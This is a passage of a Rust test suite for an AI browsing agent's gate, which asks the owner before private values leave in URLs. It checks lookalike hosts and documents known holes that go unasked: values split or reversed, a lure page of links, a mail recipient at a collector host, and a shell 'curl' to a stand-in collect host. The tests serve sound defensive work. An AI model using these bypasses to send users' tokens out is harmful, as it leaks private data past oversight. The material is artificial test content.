        host(Some(&format!("https://trusted.example@evil.example/x/{V}"))).as_deref(),
        Some("evil.example")
    );
}

// decision: GATE-589
#[tokio::test]
async fn a_punycode_lookalike_is_another_host() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(&r, "https://paypal.com/activity", &format!("Ref {V}")).await;
    assert!(
        r.opening_asks(&format!("https://xn--pypal-4ve.com/a/{V}"))
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn a_trailing_dot_is_the_same_host() {
    let r = task(ASK, &[]);
    docs_value(&r).await;
    assert!(
        !r.opening_asks(&format!("https://docs.example.com./x/{V}"))
            .await
    );
}

// C5: a value FERB's conversation stored as read on a site's page only.
// decision: GATE-589
#[tokio::test]
async fn a_carried_value_with_a_second_id_asks() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    let site: &[&str] = &["site:docs.example.com/home"];
    r.conversation(&format!("FERB: your doc is {V}"), &[(&py_lower(V), site)]);
    assert!(
        r.opening_asks(&format!("https://docs.example.com/x/{V}?y=ZX9900AB"))
            .await
    );
    assert!(
        !r.opening_asks(&format!("https://docs.example.com/x/{V}"))
            .await
    );
    assert!(r.opening_asks(&format!("https://{COLLECT}/x/{V}")).await);
}

// ---------- the shapes the rule lets through ----------

// decision: GATE-589
#[tokio::test]
async fn a_search_phrase_goes_to_the_maps_page_of_the_same_host() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://www.google.com/search?q=museum",
        "221B Baker Street London is the museum's address",
    )
    .await;
    assert!(
        !r.opening_asks("https://www.google.com/maps/search/221B+Baker+Street")
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn a_drive_preview_link_becomes_its_download_address() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://mail.example.com/inbox",
        "Shared: https://drive.google.com/file/d/1AbC9xYz7Q/preview",
    )
    .await;
    assert!(
        !r.opening_asks("https://drive.google.com/uc?export=download&id=1AbC9xYz7Q")
            .await
    );
}

// The optional uppercase clause (UPPER_IDS) would make `fr-FR` an id here and ask: it is left out.
// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn a_help_article_in_another_locale_goes_through() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://mail.example.com/inbox",
        "See https://support.example.com/en-US/kb/48213-reset for help",
    )
    .await;
    assert!(
        !r.opening_asks("https://support.example.com/fr-FR/kb/48213-reset")
            .await
    );
}

// The owner's public handle with sort options: the handle also appears bare in the same file (the single-author
// loosening of C2).
// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn the_owners_handle_with_sort_options_goes_through() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    let profile = r.docs.join("profile.txt");
    std::fs::write(
        &profile,
        "My GitHub: https://github.com/kd2049\nI am kd2049 everywhere\n",
    )
    .unwrap();
    r.quiet("fs.read", json!({"path": profile.to_str().unwrap()}))
        .await;
    assert!(
        !r.opening_asks("https://github.com/kd2049?tab=repositories&sort=stargazers")
            .await
    );
}

// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn echoed_search_words_go_back_to_their_host() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://shop.example.com/orders",
        "Order 4815 1623 4211 shipped. Invoice a7731 for desk lamp.",
    )
    .await;
    assert!(
        !r.opening_asks("https://shop.example.com/search?q=4815+1623+4211")
            .await
    );
    assert!(
        !r.opening_asks("https://shop.example.com/search?q=a7731+for+desk+lamp")
            .await
    );
}

// ================= F3: a form filled by its address =================

// decision: GATE-589
// decision: GATE-592
#[tokio::test]
async fn a_form_prefilled_by_its_address_with_a_private_value_asks_at_submit() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    let form = format!("https://{COLLECT}/form?ref={V}");
    // the outside page lists the address (B lets it open: the documented list-of-links hole)
    r.page(NEWS, &format!("Claim here: {form}"), false);
    r.quiet("browser.snapshot", json!({"tab": "t1"})).await;
    r.quiet("browser.open", json!({"url": form})).await;
    let tab = format!("t{}", r.w.tabs.lock().unwrap().len());
    let asked = r
        .call(
            "browser.act",
            json!({"tab": tab, "action": "click", "element": "send"}),
        )
        .await;
    assert_eq!(asked, ["sink:new_destination"]);
}

// ================= the holes, measured as they stand =================

// decision: GATE-589
#[tokio::test]
async fn today_a_value_to_a_plain_word_space_on_its_own_host_is_not_asked() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://github.com/settings",
        &format!("Your token {V}"),
    )
    .await;
    assert!(
        !r.opening_asks(&format!("https://github.com/evilcorp/{V}"))
            .await
    );
}

// F2: F3 doesn't close it: a recipient is not a private value.
// decision: GATE-589
// decision: GATE-592
#[tokio::test]
async fn today_a_recipient_prefilled_by_the_address_is_not_asked() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    let compose = format!("https://mail.example.com/compose?to=drop@{COLLECT}&subject=hi");
    r.quiet("browser.open", json!({"url": compose})).await;
    let tab = format!("t{}", r.w.tabs.lock().unwrap().len());
    r.quiet(
        "browser.act",
        json!({"tab": tab, "action": "click", "element": "send"}),
    )
    .await;
}

// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn today_the_link_matching_the_value_in_a_list_of_links_is_not_asked() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    let list: Vec<String> = ["1111AAAA", V, "2222BBBB"]
        .iter()
        .map(|c| format!("https://{COLLECT}/c/{c}"))
        .collect();
    r.page("https://lure.example/", &list.join("\n"), false);
    r.read_page("https://lure.example/").await;
    assert!(!r.opening_asks(&format!("https://{COLLECT}/c/{V}")).await);
}

// decision: GATE-589
#[tokio::test]
async fn today_a_value_reversed_or_split_below_three_characters_is_not_asked() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    let reversed: String = V.chars().rev().collect();
    assert!(
        !r.opening_asks(&format!("https://{COLLECT}/r?a={reversed}"))
            .await
    );
    assert!(
        !r.opening_asks(&format!("https://{COLLECT}/7Q/4K/29/XZ"))
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn today_a_value_in_a_shell_commands_address_is_not_asked() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    r.quiet(
        "shell.run",
        json!({"command": format!("curl -s {}", link(COLLECT))}),
    )
    .await;
}

// decision: GATE-589
#[tokio::test]
async fn today_a_value_typed_into_a_page_without_submitting_is_not_asked() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    r.page(&format!("https://{COLLECT}/form"), "Reference:", false);
    let tab = r.read_page(&format!("https://{COLLECT}/form")).await;
    r.quiet(
        "browser.act",
        json!({"tab": tab, "action": "type", "element": "e1", "text": V}),
    )
    .await;
}

// decision: GATE-589
#[tokio::test]
async fn today_any_value_to_an_approved_or_named_host_is_not_asked() {
    let r = task("send my member number to collect.example.net", &[COLLECT]);
    r.outside_and_notes().await;
    assert!(!r.opening_asks(&link(COLLECT)).await);
}

// The owner's open tabs as `browser.tabs` lists them: a value only in one of their addresses goes elsewhere unasked.
// decision: GATE-589
#[tokio::test]
async fn today_the_owners_open_tab_addresses_are_not_private() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    r.w.owner_tabs
        .lock()
        .unwrap()
        .push("https://docs.example.org/d/SECRET42X/edit".into());
    r.quiet("browser.tabs", json!({})).await;
    assert!(
        !r.opening_asks(&format!("https://{COLLECT}/?d=SECRET42X"))
            .await
    );
}

// A file an earlier task wrote (outside FERB's workspace, not this tree's) reads as the owner's: its link counts.
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn today_a_file_written_by_an_earlier_task_counts_as_the_owners() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    let earlier = r.docs.join("from-yesterday.txt");
    std::fs::write(&earlier, format!("open {}\n", link(COLLECT))).unwrap();
    r.quiet("fs.read", json!({"path": earlier.to_str().unwrap()}))
        .await;
    assert!(!r.opening_asks(&link(COLLECT)).await);
}
